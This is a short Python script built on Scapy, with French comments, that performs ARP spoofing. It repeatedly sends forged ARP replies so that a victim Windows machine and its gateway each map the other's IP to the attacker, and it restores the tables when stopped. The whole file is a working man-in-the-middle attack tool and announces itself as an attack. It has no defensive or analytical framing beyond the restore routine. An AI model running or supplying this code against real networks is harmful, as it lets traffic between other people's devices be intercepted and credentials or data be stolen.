import time
import sys
from scapy.all import *

# CONFIGURATION
VICTIM_IP = "192.168.100.26"    # <=== REMPLACE PAR L'IP WINDOWS
GATEWAY_IP = "192.168.100.1"   # <=== REMPLACE PAR L'IP DU ROUTEUR (souvent .1 ou .2)

def get_mac(ip):
    """Récupère l'adresse MAC d'une IP"""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[-] Impossible de trouver l'adresse MAC pour {ip}")
        sys.exit()

def spoof(target_ip, spoof_ip):
    """Envoie un faux paquet ARP"""
    target_mac = get_mac(target_ip)
    # On crée un paquet ARP réponse (op=2)
    # On dit à la cible (pdst) que NOUS avons l'IP de l'autre (psrc)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(dest_ip, source_ip):
    """Remet le réseau en état normal quand on arrête"""
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

try:
    print("[*] Lancement de l'attaque ARP Spoofing...")
    sent_packets_count = 0
    while True:
        # On dit à la victime qu'on est le routeur
        spoof(VICTIM_IP, GATEWAY_IP)
        # On dit au routeur qu'on est la victime
        spoof(GATEWAY_IP, VICTIM_IP)
        
        sent_packets_count += 2
        print(f"\r[+] Paquets envoyés: {sent_packets_count}", end="")
        time.sleep(2) # Pause de 2 secondes pour ne pas inonder le réseau

except KeyboardInterrupt:
    print("\n[!] Arrêt de l'attaque. Restauration du réseau...")
    restore(VICTIM_IP, GATEWAY_IP)
    restore(GATEWAY_IP, VICTIM_IP)
    print("[+] Réseau restauré.")